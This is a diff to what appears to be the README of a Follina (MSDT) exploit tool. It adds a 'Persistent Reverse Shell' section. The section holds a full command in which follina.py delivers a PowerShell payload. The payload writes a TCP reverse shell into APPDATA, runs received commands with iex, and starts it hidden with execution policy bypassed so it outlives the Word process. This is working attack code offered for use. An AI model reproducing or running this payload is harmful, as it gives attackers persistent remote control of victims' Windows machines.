@@ -52,6 +52,16 @@ python3 follina.py -i enp0s3 -p 8008 -c "export RHOST=<RHOST_IP>;export RPORT=55
 
 ---
 
+### Persistent Reverse Shell
+#### Still open after closing parent word process
+
+```bash
+python3 follina.py -i enp0s3 -p 8001 -c 'cd $env:APPDATA;echo "`$c=New-Object System.Net.Sockets.TCPClient(`"<REMOTE_IP_HOSTNAME>`",5555);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length))-ne 0){`$d=(New-Object System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `". { `$d } 2>&1`" | Out-String)+`"PS `"+(pwd).Path+`"> `";`$sb=[text.encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()};`$c.Close()">t.ps1;Start powershell -WindowStyle Hidden -ArgumentList "-ep Bypass -f t.ps1"'
+```
+
+
+---
+
 
 ![grafik](https://github.com/user-attachments/assets/6adefab8-b657-4e98-bcd8-37d83db8387a)
 
